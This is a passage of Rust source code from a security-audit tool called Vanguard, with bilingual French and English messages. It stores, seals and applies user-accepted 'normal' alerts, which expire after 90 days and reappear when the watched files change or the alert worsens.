//! Ce que Vanguard apprend sur cet ordinateur, gardé ici seulement (appris.json) : les alertes que tu as déclarées
//! normales chez toi. Une alerte acceptée reste visible, au niveau info, avec la date de ton choix ; elle n'est plus
//! proposée à la correction ni notifiée par la surveillance. Elle revient au bout de 90 jours, ou tout de suite si
//! elle devient plus grave qu'au moment de ton choix. « Ce que Vanguard a appris » (menu Cette machine) montre tout et
//! permet d'oublier.

#![warn(clippy::arithmetic_side_effects, clippy::as_conversions)]

use std::collections::BTreeMap;

use chrono::NaiveDate;
use serde::{Deserialize, Serialize};

use crate::machine::Constat;
use crate::risk::Niveau;
use crate::ui::*;

/// Durée d'un choix : au-delà, Vanguard repose la question (la situation a pu changer).
const DUREE_JOURS: i64 = 90;

#[derive(Serialize, Deserialize, Default, Clone)]
struct Appris {
    #[serde(default)]
    acceptees: BTreeMap<String, Acceptee>,
}

/// Une alerte déclarée normale : telle qu'elle était, et quand.
#[derive(Serialize, Deserialize, Clone, Debug, PartialEq)]
struct Acceptee {
    categorie: String,
    message: String,
    niveau: Niveau,
    /// AAAA-MM-JJ.
    le: String,
    /// Sa clé (`Constat::cle`, « LNX-RES-001|port:8080/tcp:python3 ») quand sa règle en pose une : c'est elle qui
    /// la reconnaît, quelle que soit la langue. Absente des choix d'avant les clés, retrouvés par leur texte puis
    /// complétés d'elle (écriture scellée). Une version plus ancienne l'ignore et la retire en réécrivant la liste :
    /// le choix est alors retrouvé par son texte, comme avant.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    cle: Option<String>,
    /// L'empreinte des témoins de l'alerte au moment du choix (`machine::temoins`) : pour une alerte qui en relève,
    /// le choix ne vaut que pour cet état exact (un fichier changé, une ligne ajoutée, et elle revient). Un choix
    /// sans elle ne tait jamais une alerte à témoins, même à la même clé.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    etat: Option<String>,
    /// Les lignes déclarées normales, telles que montrées avant le choix (« fichier:ligne : ligne »), pour le menu.
    #[serde(default, skip_serializing_if = "Vec::is_empty")]
    lignes: Vec<String>,
    /// La trace de chaque ligne au moment du choix (`temoins::Trace`) : quand l'alerte revient, chaque ligne se dit
    /// déjà acceptée, nouvelle ou changée. Pour le dire seulement : le choix tient à `etat`.
    #[serde(default, skip_serializing_if = "Vec::is_empty")]
    traces: Vec<crate::machine::temoins::Trace>,
}

fn fichier() -> std::path::PathBuf {
    crate::socle::dossier_local().join(crate::sceau::APPRIS)
}

/// Pourquoi la liste des choix ne compte pas.
enum Refus {
    Illisible,
    /// Changée hors de Vanguard (`sceau`) : un programme du compte qui s'y ajoute fait taire sa propre alerte. Ce
    /// qu'elle contient maintenant, si ça se lit, pour que tu la reprennes ou l'oublies.
    Falsifiee(Option<Appris>),
}

/// Les choix retenus ; `Err` si la liste existe mais ne se lit plus, ou a été changée hors de Vanguard. Alors aucun
/// choix n'est appliqué (les alertes se montrent comme d'habitude, jamais l'inverse) et rien ne l'écrase : les choix
/// d'avant ne se perdent pas en silence.
fn charger() -> Result<Appris, Refus> {
    use crate::sceau::{Doute, Juge};
    match crate::sceau::juge(crate::sceau::APPRIS) {
        // Inconnue (sceaux refaits) : une liste vide ne tait rien.
        Juge::Absent | Juge::Douteux(Doute::Inconnu, _) => Ok(Appris::default()),
        // Adoptée lors de la mise à jour d'une version d'avant les sceaux : appliquée comme alors. Adoptée après des
        // sceaux refaits, elle ne tait rien (`sceau::juge`) : le menu propose de la reprendre ou de l'oublier.
        Juge::Cru(o) => serde_json::from_slice(&o).map_err(|_| Refus::Illisible),
        Juge::Douteux(_, o) => Err(Refus::Falsifiee(o.and_then(|o| serde_json::from_slice(&o).ok()))),
        Juge::Illisible(_) => Err(Refus::Illisible),
    }
}

/// Le verrou d'une écriture de la liste à la fois, de sa relecture à son écriture (`sous_verrou`).
pub(crate) const VERROU: &str = "appris.lock";

/// Ce qu'une écriture fait de la liste relue sous le verrou.
enum Nouvelle {
    /// Rien : la liste reste telle quelle.
    Inchangee,
    Ecrire(Appris),
    /// Effacée (ses choix oubliés).
    Effacer,
}

/// Le seul chemin d'écriture de la liste des choix (vérification de la campagne E, N8) : sous le verrou, la liste est
/// relue, `changer` décide sur ce qu'elle contient maintenant (pas sur ce qui a été lu avant une question), puis
/// elle est écrite. Deux Vanguard (un bilan qui complète des clés, un menu qui oublie un choix) ne s'écrasent pas :
/// un choix retiré ne revient pas, un choix retenu ne se perd pas. `Ok(true)` : écrite ; `Err` : verrou pas tenu ou
/// écriture ratée, rien n'a changé.
fn sous_verrou(changer: impl FnOnce(Result<Appris, Refus>) -> Nouvelle) -> std::io::Result<bool> {
    let _verrou = crate::socle::Verrou::prendre(
        &crate::socle::dossier_local(),
        VERROU,
        false,
        crate::socle::ATTENTE_ECRITURE,
    )
    .map_err(|e| e.erreur(VERROU))?;
    match changer(charger()) {
        Nouvelle::Inchangee => Ok(false),
        Nouvelle::Ecrire(a) => enregistrer(&a).map(|()| true),
        Nouvelle::Effacer => crate::sceau::effacer(crate::sceau::APPRIS).map(|()| true),
    }
}

/// La même liste, au choix près : ce qui a été montré à la personne est encore ce qui serait écrit.
fn meme_liste(a: &Appris, b: &Appris) -> bool {
    serde_json::to_string(a).ok() == serde_json::to_string(b).ok()
}

fn enregistrer(appris: &Appris) -> std::io::Result<()> {
    crate::sceau::ecrire(
        crate::sceau::APPRIS,
        serde_json::to_string_pretty(appris).unwrap_or_default(),
    )
}

/// Une alerte reconnue d'un bilan à l'autre sans ses quantités (« 12 % libres » et « 9 % libres » sont la même). Une
/// adresse, une heure ou une version (des nombres liés par « . » ou « : ») reste telle quelle : accepter un DNS
/// réglé vers 10.0.0.5 ne doit jamais faire taire un DNS détourné vers une autre adresse ; un port non plus. Un
/// nombre collé à un nom (« maj2.desktop », « S-1-5-21-… », « id_ed25519 ») en fait partie et reste aussi :
/// accepter un programme ne fait pas taire son voisin au numéro près. Le message est dans la langue de l'interface :
/// changer de langue fait revenir les alertes acceptées, du bon côté, sauf celles qui ont une clé (`Acceptee::cle`).
fn signature(categorie: &str, message: &str) -> String {
    if categorie == "Ports en écoute" {
        return format!("{categorie} : {message}");
    }
    let lettres: Vec<char> = message.chars().collect();
    let mut sortie = String::new();
    let mut i = 0;
    while let Some(&lettre) = lettres.get(i) {
        if !lettre.is_ascii_digit() {
            sortie.push(lettre);
            i = i.saturating_add(1);
            continue;
        }
        // Un bloc de chiffres, avec ce qui les lie (« 10.0.0.5 », « 12:30 », « 4.5.4 »).
        let debut = i;
        while let Some(&c) = lettres.get(i)
            && (c.is_ascii_digit()
                || (matches!(c, '.' | ':')
                    && i.checked_add(1)
                        .and_then(|j| lettres.get(j))
                        .is_some_and(char::is_ascii_digit)))
        {
            i = i.saturating_add(1);
        }
        let bloc: String = lettres.iter().take(i).skip(debut).collect();
        let lie = |c: Option<&char>| c.is_some_and(|c| c.is_alphanumeric() || *c == '_');
        // Avant : une lettre, « _ », ou un « - » qui suit lui-même une lettre ou un chiffre (« S-1-5 », pas « -60 »).
        let avant = lie(debut.checked_sub(1).and_then(|j| lettres.get(j)))
            || (debut.checked_sub(1).and_then(|j| lettres.get(j)) == Some(&'-')
                && lie(debut.checked_sub(2).and_then(|j| lettres.get(j))));
        let apres = lettres.get(i).is_some_and(|c| c.is_alphabetic() || *c == '_');
        if bloc.contains(['.', ':']) || avant || apres {
            sortie.push_str(&bloc);
        } else {
            sortie.push('#');
        }
    }
    format!("{categorie} : {sortie}")
}

fn aujourd_hui() -> NaiveDate {
    chrono::Local::now().date_naive()
}

fn date(texte: &str) -> Option<NaiveDate> {
    NaiveDate::parse_from_str(texte, "%Y-%m-%d").ok()
}

fn affichee(d: NaiveDate) -> String {
    d.format(tr!("%d/%m/%Y", "%Y-%m-%d")).to_string()
}

/// Le choix vaut-il encore pour cette alerte, ce jour-là ?
/// Une date de choix dans le futur (horloge fausse ce jour-là) ne vaut pas : elle durerait plus de 90 jours.
fn en_vigueur(choix: &Acceptee, niveau: Niveau, jour: NaiveDate) -> bool {
    niveau <= choix.niveau
        && date(&choix.le).is_some_and(|le| (0..DUREE_JOURS).contains(&jour.signed_duration_since(le).num_days()))
}

/// Une alerte peut-elle être déclarée normale ? `Err` : pourquoi pas, prêt à montrer. Une correction automatique
/// sans témoins se déclare comme avant (par sa clé ou son texte) ; une alerte à corriger soi-même, seulement si sa
/// règle relève ce que le choix lierait (`machine::temoins`) ; un relevé refusé (illisible, ambigu, trop de lignes),
/// jamais. Une alerte critique à corriger soi-même non plus : elle reste montrée jusqu'à être corrigée.
pub fn declarable(c: &Constat) -> Result<(), crate::machine::temoins::Refus> {
    use crate::machine::temoins::{Refus, Temoins};
    let refus = |phrase: &str| Err(Refus(phrase.to_string()));
    let (Some(niveau), Some(k)) = (c.probleme, &c.correctif) else {
        return refus(tr!("pas une alerte à corriger", "not an alert to fix"));
    };
    // Une bibliothèque hors paquet préchargée dans tous les programmes, c'est la marque d'un rootkit : la taire par
    // un choix ferait le travail de celui qui l'a posée. Une correction automatique critique reste déclarable comme
    // avant (son état est celui d'un réglage, pas d'un fichier posé).
    if niveau >= Niveau::Critique && !matches!(k.temoins, Temoins::Aucun) {
        return refus(tr!(
            "une alerte critique à corriger soi-même ne se tait pas par un choix ; elle reste montrée jusqu'à être corrigée",
            "a critical alert to fix yourself cannot be silenced by a choice; it stays shown until it is fixed"
        ));
    }
    match &k.temoins {
        Temoins::Refuse(raison) => refus(raison),
        Temoins::Releves(_) => Ok(()),
        Temoins::Aucun if k.automatique => Ok(()),
        Temoins::Aucun => refus(tr!(
            "Vanguard ne relève pas encore ce qu'un tel choix lierait pour cette alerte",
            "Vanguard does not yet record what such a choice would be bound to for this alert"
        )),
    }
}

/// Montre exactement ce qui serait déclaré normal, demande de le confirmer, et le retient ; `true` si c'est retenu.
/// Toujours confirmé après le détail : « o » sous le niveau élevé, « normal » tapé à partir de lui (jamais une seule
/// touche par mégarde). Seulement au clavier d'un terminal : une réponse venue d'un tube ou d'un fichier n'est pas
/// celle d'une personne qui a lu.
pub fn declarer_normale(c: &Constat) -> bool {
    use crate::machine::temoins::Temoins;
    use std::io::IsTerminal as _;
    if !(std::io::stdin().is_terminal() && std::io::stdout().is_terminal()) {
        afficher_aligne(
            "    ✖ ",
            tr!(
                "Un choix « normal » ne se fait qu'au clavier, dans un terminal : rien n'est retenu.",
                "A “normal” choice is only made at the keyboard, in a terminal: nothing is saved."
            ),
            6,
            "",
        );
        return false;
    }
    if let Err(raison) = declarable(c) {
        afficher_aligne(
            "    ✖ ",
            &trf!(
                "Ne peut pas être déclarée normale : {raison}.",
                "Cannot be declared normal: {raison}."
            ),
            6,
            "",
        );
        return false;
    }
    let niveau = c.probleme.unwrap_or(Niveau::Info);
    trp!(
        "
  {GRAS}Ce qui sera déclaré normal chez vous :{RESET}",
        "
  {GRAS}What will be declared normal for you:{RESET}"
    );
    afficher_aligne(
        &format!("  {}[{}]{RESET} ", couleur(niveau), niveau.libelle()),
        &format!("{} — {}", crate::langue::categorie(c.categorie), c.message),
        4,
        "",
    );
    let temoins = c.temoins();
    let lignes = temoins.lignes();
    // Revenue après un choix : chaque ligne dit si elle était déjà acceptée, ou ce qui a changé depuis.
    let traces: Vec<crate::machine::temoins::Trace> = charger()
        .ok()
        .and_then(|a| choix_pour(&a, c).map(|(choix, _)| choix.traces.clone()))
        .unwrap_or_default();
    if lignes.is_empty() {
        match c.cle() {
            Some(cle) => afficher_aligne(
                "  ",
                &trf!(
                    "Reconnue par sa clé : {}",
                    "Recognized by its key: {}",
                    crate::ui::affichable(&cle.to_string())
                ),
                4,
                GRIS,
            ),
            None => afficher_aligne("  ", tr!("Reconnue par son texte.", "Recognized by its text."), 4, GRIS),
        }
    } else {
        trp!(
            "  Chaque ligne signalée ({}), sans exception :",
            "  Every reported line ({}), without exception:",
            lignes.len()
        );
        for t in &lignes {
            if traces.is_empty() {
                afficher_aligne("   • ", &t.ou, 5, GRAS);
            } else {
                afficher_aligne("   • ", &format!("{} ({})", t.ou, t.marque(&traces).libelle()), 5, GRAS);
            }
            afficher_aligne("       ", &t.ligne, 7, "");
            if let Some(e) = &t.contenant {
                afficher_aligne("       ", &trf!("fichier : {e}", "file: {e}"), 7, GRIS);
            }
            for c in &t.cibles {
                afficher_aligne("       → ", &format!("{} : {}", c.chemin, c.etat), 9, GRIS);
                // Le contenu d'un petit script se lit avant de le déclarer normal : c'est lui qui est accepté.
                for l in c.apercu.iter().flatten() {
                    afficher_aligne("         | ", l, 11, GRIS);
                }
                // Un contenu lié sans être montré : la personne doit le savoir, et peut comparer l'empreinte.
                if c.cache {
                    afficher_aligne(
                        "         ",
                        tr!(
                            "contenu non montré (trop long, ou pas du texte) : seule son empreinte est liée ; sha256sum la donne pour comparer",
                            "content not shown (too long, or not text): only its fingerprint is bound; sha256sum gives it for comparison"
                        ),
                        9,
                        GRIS,
                    );
                }
            }
        }
        afficher_aligne(
            "  ",
            tr!(
                "Si l'un de ces fichiers ou ce qu'une ligne lance change, s'il devient un lien, ou si une ligne s'ajoute, l'alerte revient.",
                "If one of these files or what a line starts changes, if it becomes a link, or if a line is added, the alert comes back."
            ),
            2,
            "",
        );
    }
    afficher_aligne(
        "  ",
        &trf!(
            "Le choix vaut {DUREE_JOURS} jours, et cesse si l'alerte devient plus grave.",
            "The choice lasts {DUREE_JOURS} days, and ends if the alert gets worse."
        ),
        2,
        GRIS,
    );
    let confirme = if niveau >= Niveau::Eleve {
        demander_ou_defaut(tr!(
            "  Tapez « normal » puis Entrée pour confirmer (autre chose annule) : ",
            "  Type “normal” then Enter to confirm (anything else cancels): "
        ))
        .trim()
        .eq_ignore_ascii_case("normal")
    } else {
        crate::langue::oui(&demander_ou_defaut(tr!(
            "  La déclarer normale ? [o/N] : ",
            "  Declare it normal? [y/N]: "
        )))
    };
    if !confirme {
        trp!(
            "    {GRIS}rien n'est retenu{RESET}",
            "    {GRIS}nothing is saved{RESET}"
        );
        return false;
    }
    // Ce qui a été montré a été lu au bilan, peut-être avant que la personne regarde : le relevé est refait
    // maintenant, et le choix ne lie que ce qui est encore exactement là (un script remis au propre le temps de la
    // lecture, puis rendu, se voit ici).
    if matches!(temoins, Temoins::Releves(_)) {
        let maintenant = crate::machine::temoins_maintenant(c);
        // Le même contenu ne suffit pas : un fichier échangé le temps de la lecture, puis remis, a changé de date de
        // changement (ctime) ou de numéro, ce qu'aucun programme du compte ne remet.
        if maintenant.as_ref().and_then(Temoins::empreinte) != temoins.empreinte()
            || maintenant.as_ref().and_then(Temoins::vus) != temoins.vus()
        {
            afficher_aligne(
                "    ✖ ",
                tr!(
                    "Un de ces fichiers a changé pendant que vous lisiez : rien n'est retenu. Relancez la vérification pour voir ce qu'il contient maintenant.",
                    "One of these files changed while you were reading: nothing is saved. Run the check again to see what it contains now."
                ),
                6,
                "",
            );
            return false;
        }
    }
    accepter(c)
}

/// Retient qu'une alerte est normale ici ; `true` si c'est retenu. Jamais une alerte qui ne se déclare pas
/// (`declarable`).
fn accepter(c: &Constat) -> bool {
    let Some(niveau) = c.probleme else {
        return false;
    };
    if declarable(c).is_err() {
        return false;
    }
    // Relue sous le verrou : deux Vanguard qui retiennent chacun un choix en même temps n'en perdent aucun.
    let ecrit = sous_verrou(|lue| match lue {
        Ok(mut appris) => {
            retenir(&mut appris, c, niveau, aujourd_hui());
            Nouvelle::Ecrire(appris)
        }
        Err(Refus::Illisible) => {
            trp!(
                "    ✖ La liste de vos choix ne se lit plus ({}) : rien n'est retenu, pour ne pas l'écraser.",
                "    ✖ Your choice list can no longer be read ({}): nothing is saved, so as not to overwrite it.",
                fichier().display()
            );
            Nouvelle::Inchangee
        }
        Err(Refus::Falsifiee(_)) => {
            trp!(
                "    ✖ La liste de vos choix a été changée hors de Vanguard : rien\n      n'est retenu. « Ce que Vanguard a appris » la montre, pour la\n      reprendre ou l'oublier.",
                "    ✖ Your choice list was changed outside Vanguard: nothing is\n      saved. “What Vanguard has learned” shows it, to take it back or\n      forget it."
            );
            Nouvelle::Inchangee
        }
    });
    match ecrit {
        Ok(false) => false,
        Ok(true) => {
            crate::amelioration::noter_choix(c.regle, crate::amelioration::Choisi::Normale);
            noter_au_journal(c);
            trp!(
                "    {GRIS}retenu pour {DUREE_JOURS} jours, sauf si elle s'aggrave{RESET}",
                "    {GRIS}noted for {DUREE_JOURS} days, unless it gets worse{RESET}"
            );
            true
        }
        Err(e) => {
            trp!("    ✖ Choix non retenu ({e}).", "    ✖ Choice not saved ({e}).");
            false
        }
    }
}

/// Le choix va au journal des événements, daté, avec la clé de l'alerte qu'il tait : un choix fait à l'insu de la
/// personne (un programme du compte qui ouvre un terminal) y laisse sa trace. Sa règle et sa catégorie seulement,
/// jamais le texte de l'alerte (des chemins du dossier personnel).
fn noter_au_journal(c: &Constat) {
    use crate::modele::evenement::{Evenement, Genre, Source};
    let cle = c.cle().map(|k| k.to_string());
    crate::modele::journal::noter(
        Evenement::nouveau(
            Source::Utilisateur,
            Genre::Normale {
                titre: format!("{} ({})", c.categorie, c.regle),
            },
        )
        .cle(cle.as_deref()),
    );
}

/// Ajoute le choix d'une alerte à la liste. Un seul choix par clé : l'ancien, écrit dans une autre langue ou une
/// autre tournure (donc sous une autre signature), resterait à côté et pourrait masquer celui-ci dans `choix_pour`.
fn retenir(appris: &mut Appris, c: &Constat, niveau: Niveau, jour: NaiveDate) {
    let cle = c.cle().map(|k| k.to_string());
    if let Some(k) = &cle {
        appris.acceptees.retain(|_, a| a.cle.as_ref() != Some(k));
    }
    let message = sans_revenue(&c.message);
    appris.acceptees.insert(
        signature(c.categorie, message),
        Acceptee {
            categorie: c.categorie.to_string(),
            message: message.to_string(),
            niveau,
            le: jour.format("%Y-%m-%d").to_string(),
            cle,
            etat: c.temoins().empreinte(),
            lignes: c
                .temoins()
                .lignes()
                .iter()
                .map(|t| format!("{} : {}", t.ou, t.ligne))
                .collect(),
            traces: c.temoins().traces(),
        },
    );
}

/// Combien d'alertes sont déclarées normales ici (`None` : la liste ne se lit plus), pour le menu Paramètres.
pub fn nombre() -> Option<usize> {
    charger().ok().map(|a| a.acceptees.len())
}

/// Applique tes choix au bilan : une alerte acceptée passe au niveau info, avec la date du choix, sans correction
/// proposée. Rend le nombre d'alertes concernées. Un choix d'avant les clés, retrouvé par son texte, reçoit la clé
/// de son alerte : le prochain bilan le retrouvera même dans l'autre langue.
pub fn appliquer(constats: &mut [Constat]) -> usize {
    let Ok(mut appris) = charger() else {
        return 0;
    };
    // Adoptée sans sceau d'avant : ses états exacts ne valent rien tant qu'elle n'est pas reprise (`sans_etats`).
    if crate::sceau::adopte(crate::sceau::APPRIS) {
        retirer_etats(&mut appris);
    }
    let mut cles = Vec::new();
    let n = appliquer_avec(&appris, constats, aujourd_hui(), &mut cles);
    // Pas sur une liste adoptée au premier usage des sceaux : la réécrire la scellerait sans ton accord (le menu le
    // demande).
    // Les clés s'ajoutent à la liste relue sous le verrou, pas à celle lue au début du bilan : un choix oublié
    // entre-temps dans un autre Vanguard ne revient pas.
    if !cles.is_empty() && !crate::sceau::adopte(crate::sceau::APPRIS) {
        let mut completes = Vec::new();
        let ecrite = sous_verrou(|lue| match lue {
            Ok(mut a) if !crate::sceau::adopte(crate::sceau::APPRIS) => {
                completes = completer(&mut a, cles);
                if completes.is_empty() {
                    Nouvelle::Inchangee
                } else {
                    Nouvelle::Ecrire(a)
                }
            }
            _ => Nouvelle::Inchangee,
        });
        // Jamais en silence : chaque choix rattaché à une clé va au journal des événements (appris.json vient d'être
        // réécrit sans geste de la personne).
        if ecrite.is_ok_and(|e| e) {
            for (categorie, cle) in completes {
                noter_completion(&categorie, &cle);
            }
        }
    }
    n
}

/// Un choix d'avant les clés, rattaché à la clé de son alerte : au journal des événements, sa catégorie et sa clé
/// (comme le choix lui-même, `noter_au_journal`), jamais le texte de l'alerte.
fn noter_completion(categorie: &str, cle: &str) {
    use crate::modele::evenement::{Evenement, Genre, Source};
    crate::modele::journal::noter(
        Evenement::nouveau(
            Source::Vanguard,
            Genre::Normale {
                titre: trf!(
                    "{categorie} : choix d'avant les clés rattaché à son alerte",
                    "{categorie}: choice from before keys tied to its alert"
                ),
            },
        )
        .cle(Some(cle)),
    );
}

/// `appliquer` sans rien écrire : les alertes déclarées normales rabaissées de même, mais les clés d'un choix
/// d'avant ne sont pas complétées dans appris.json. Pour un aperçu (`machine::apercu`), qui ne laisse aucune trace.
pub(crate) fn appliquer_sans_ecrire(constats: &mut [Constat]) -> usize {
    let Ok(mut appris) = charger() else {
        return 0;
    };
    if crate::sceau::adopte(crate::sceau::APPRIS) {
        retirer_etats(&mut appris);
    }
    let mut cles = Vec::new();
    appliquer_avec(&appris, constats, aujourd_hui(), &mut cles)
}

/// Pour les essais d'autres modules : un choix « normal » fait sur `declare` (s'il se déclare) tait-il `plus_tard` ?
#[cfg(all(test, target_os = "linux"))]
pub(crate) fn essai_tait(declare: &Constat, plus_tard: &Constat) -> bool {
    let Some(niveau) = declare.probleme else {
        return false;
    };
    if declarable(declare).is_err() {
        return false;
    }
    let mut a = Appris::default();
    retenir(&mut a, declare, niveau, aujourd_hui());
    let mut c = [plus_tard.clone()];
    appliquer_le(&a, &mut c, aujourd_hui()) == 1
}

#[cfg(test)]
fn appliquer_le(appris: &Appris, constats: &mut [Constat], jour: NaiveDate) -> usize {
    appliquer_avec(appris, constats, jour, &mut Vec::new())
}

/// Le choix qui vaut pour une alerte : par sa clé quand elle en a une ; sinon, ou si aucun choix n'a cette clé, par
/// son texte, mais seulement un choix sans clé (un choix à clé ne vaut que pour son objet, jamais pour un autre au
/// même texte). Rend aussi la signature du choix trouvé par le texte, à compléter de la clé.
fn choix_pour<'a>(appris: &'a Appris, c: &Constat) -> Option<(&'a Acceptee, Option<(String, String)>)> {
    let signature = signature(c.categorie, &c.message);
    let Some(cle) = c.cle().map(|k| k.to_string()) else {
        return appris
            .acceptees
            .get(&signature)
            .or_else(|| choix_du_noyau_groupe(appris, c))
            .map(|a| (a, None));
    };
    // Une liste écrite avant `retenir` peut garder deux choix de la même clé : le plus récent l'emporte, jamais un
    // choix périmé qui ferait revenir l'alerte malgré celui du jour.
    if let Some(a) = appris
        .acceptees
        .values()
        .filter(|a| a.cle.as_deref() == Some(cle.as_str()))
        .max_by(|x, y| x.le.cmp(&y.le))
    {
        return Some((a, None));
    }
    let a = appris.acceptees.get(&signature).filter(|a| a.cle.is_none())?;
    Some((a, Some((signature, cle))))
}

/// Le noyau Linux en une seule alerte avant ce lot (« Réglages faibles : a, b, c »), en trois maintenant (mémoire,
/// fichiers partagés, réseau) : un ancien choix sans clé vaut pour chacune des trois si chaque réglage faible qu'elle
/// cite y figurait déjà. Un réglage devenu faible depuis fait revenir l'alerte.
fn choix_du_noyau_groupe<'a>(appris: &'a Appris, c: &Constat) -> Option<&'a Acceptee> {
    const CAT: &str = "Noyau durci";
    let prefixe = tr!("Réglages faibles : ", "Weak settings: ");
    if c.categorie != CAT {
        return None;
    }
    let reste = c.message.strip_prefix(prefixe)?.trim_end_matches('.');
    let debut = signature(CAT, prefixe);
    // Chaque réglage sans son « Noyau durci : » : la signature d'un réglage seul, telle qu'elle apparaît dans
    // celle de l'ancien message.
    let elements: Vec<String> = reste
        .split(", ")
        .map(|e| signature(CAT, e)[CAT.len().saturating_add(3)..].to_string())
        .collect();
    appris.acceptees.iter().find_map(|(sig, a)| {
        (a.cle.is_none() && sig.starts_with(&debut) && elements.iter().all(|e| sig.contains(e.as_str()))).then_some(a)
    })
}

/// Complète les choix retrouvés par leur texte de la clé de leur alerte ; rend (catégorie, clé) de chaque choix
/// complété (vide : rien à réécrire).
fn completer(appris: &mut Appris, cles: Vec<(String, String)>) -> Vec<(String, String)> {
    let mut completes = Vec::new();
    for (signature, cle) in cles {
        if let Some(a) = appris.acceptees.get_mut(&signature)
            && a.cle.is_none()
        {
            a.cle = Some(cle.clone());
            completes.push((a.categorie.clone(), cle));
        }
    }
    completes
}

/// Les clés à compléter d'une passe : (constat, signature du choix sans clé, clé du constat). Une signature retrouvée
/// par plusieurs constats de clés différentes n'est pas complétée : deux fichiers dont les noms ne diffèrent que par un
/// invisible ont le même message (`affichable`), et la clé irait au premier lu, peut-être le sosie. Le choix reste
/// sans clé (il vaut pour les deux, comme avant les clés) et chacun de ces constats le dit. Rend celles qui restent.
fn sans_ambigues(constats: &mut [Constat], trouvees: &[(usize, String, String)]) -> Vec<(String, String)> {
    let mut gardees = Vec::new();
    for (i, signature, cle) in trouvees {
        let memes: Vec<&(usize, String, String)> = trouvees.iter().filter(|t| t.1 == *signature).collect();
        if memes.iter().all(|t| t.2 == *cle) {
            if !gardees.iter().any(|(s, _): &(String, String)| s == signature) {
                gardees.push((signature.clone(), cle.clone()));
            }
        } else if let Some(c) = constats.get_mut(*i) {
            let n = memes.len();
            c.message += &trf!(
                " (ce choix d'avant, sans objet précis, vaut pour {n} alertes au même texte)",
                " (this earlier choice, with no precise object, covers {n} alerts with the same text)"
            );
        }
    }
    gardees
}

fn appliquer_avec(
    appris: &Appris,
    constats: &mut [Constat],
    jour: NaiveDate,
    a_completer: &mut Vec<(String, String)>,
) -> usize {
    let mut n = 0usize;
    let mut trouvees = Vec::new();
    for (i, c) in constats.iter_mut().enumerate() {
        let Some(niveau) = c.probleme else {
            continue;
        };
        let Some((choix, completer)) = choix_pour(appris, c) else {
            // Une ligne ajoutée change la clé : le choix d'avant n'est plus le sien, et rien n'est tu. Pour le dire
            // seulement : si un choix de la même catégorie liait des lignes toutes encore là, l'alerte dit lesquelles
            // sont nouvelles (campagne E, M-a).
            if let Some((ajoutees, le)) = lignes_ajoutees(appris, c) {
                c.message += &trf!(
                    " (revenue : {ajoutees}, depuis votre choix du {le})",
                    " (back: {ajoutees}, since your choice on {le})"
                );
            }
            continue;
        };
        if !en_vigueur(choix, niveau, jour) {
            continue;
        }
        let le = date(&choix.le).map(affichee).unwrap_or_default();
        // Une alerte à témoins ne se tait que pour l'état exact déclaré normal ; un relevé refusé aujourd'hui (un
        // fichier devenu illisible, une ligne devenue ambiguë), jamais. Un choix qui lie un état ne tait pas non plus
        // une alerte qui n'en relève plus. Revenue, elle dit pourquoi.
        if let Some(pourquoi) = revenue(choix, c.temoins()) {
            c.message += &trf!(
                " (revenue : {pourquoi}, depuis votre choix du {le})",
                " (back: {pourquoi}, since your choice on {le})"
            );
            continue;
        }
        trouvees.extend(completer.map(|(signature, cle)| (i, signature, cle)));
        c.probleme = Some(Niveau::Info);
        c.correctif = None;
        c.message += &trf!(
            " (normal chez vous, selon votre choix du {le})",
            " (normal for you, as you chose on {le})"
        );
        n = n.saturating_add(1);
    }
    a_completer.extend(sans_ambigues(constats, &trouvees));
    n
}

/// Les lignes nouvelles d'une alerte à témoins qu'aucun choix ne tait, quand un choix de sa catégorie liait des
/// lignes qui y sont toutes encore (trois au plus, nommées), et la date de ce choix. Pour le dire, jamais pour taire.
fn lignes_ajoutees(appris: &Appris, c: &Constat) -> Option<(String, String)> {
    use crate::machine::temoins::Marque;
    let lignes = c.temoins().lignes();
    if lignes.is_empty() {
        return None;
    }
    let choix = appris.acceptees.values().find(|a| {
        a.categorie == c.categorie
            && !a.traces.is_empty()
            && a.traces.iter().all(|t| lignes.iter().any(|l| l.trace.ligne == t.ligne))
    })?;
    let nouvelles: Vec<String> = lignes
        .iter()
        .filter(|t| t.marque(&choix.traces) == Marque::Nouvelle)
        .map(|t| format!("{} {}", t.ou, Marque::Nouvelle.libelle()))
        .collect();
    if nouvelles.is_empty() {
        return None;
    }
    let mut dit = nouvelles.iter().take(3).cloned().collect::<Vec<_>>().join(", ");
    let reste = nouvelles.len().saturating_sub(3);
    if reste > 0 {
        dit.push_str(&trf!(" et {reste} autre(s)", " and {reste} more"));
    }
    Some((dit, date(&choix.le).map(affichee).unwrap_or_default()))
}

/// Le message d'une alerte sans ce qu'`appliquer_avec` y ajoute quand elle revient : le choix retient l'alerte, pas
/// l'histoire de son retour.
fn sans_revenue(message: &str) -> &str {
    [" (revenue : ", " (back: "]
        .iter()
        .filter_map(|m| message.rfind(m))
        .max()
        .and_then(|i| message.get(..i))
        .unwrap_or(message)
}

/// Pourquoi un choix en vigueur ne tait pas l'alerte, telle qu'elle est relevée aujourd'hui ; `None` : il la tait.
/// Chaque ligne changée ou nouvelle est nommée (trois au plus), pour qu'on ne redéclare pas en bloc ce qui a bougé.
fn revenue(choix: &Acceptee, temoins: &crate::machine::temoins::Temoins) -> Option<String> {
    use crate::machine::temoins::{Marque, Temoins};
    match temoins {
        Temoins::Aucun if choix.etat.is_none() => None,
        Temoins::Aucun => Some(tr!("plus rien à vérifier", "nothing left to check").to_string()),
        // La raison dite telle quelle : un choix d'avant que le périmètre déclarable ne couvre plus (profil, variable,
        // Hyprland hors de ses lancements) revient avec la phrase qui dit quoi faire.
        Temoins::Refuse(raison) => Some(trf!(
            "ne se vérifie plus : {raison}",
            "can no longer be checked: {raison}"
        )),
        Temoins::Releves(_) if choix.etat.is_some() && choix.etat == temoins.empreinte() => None,
        Temoins::Releves(_) if choix.etat.is_none() => Some(
            tr!(
                "ce choix ne disait pas l'état exact de ses fichiers",
                "this choice did not record the exact state of its files"
            )
            .to_string(),
        ),
        Temoins::Releves(_) => {
            let changees: Vec<String> = temoins
                .lignes()
                .iter()
                .filter_map(|t| {
                    let m = t.marque(&choix.traces);
                    (m != Marque::DejaAcceptee || choix.traces.is_empty()).then(|| format!("{} {}", t.ou, m.libelle()))
                })
                .collect();
            // Chaque ligne dit déjà ce qui lui est arrivé (« programme changé », « nouvelle ») ; sans traces, un mot.
            if choix.traces.is_empty() || changees.is_empty() {
                Some(tr!("changé", "changed").to_string())
            } else {
                let mut dit = changees.iter().take(3).cloned().collect::<Vec<_>>().join(", ");
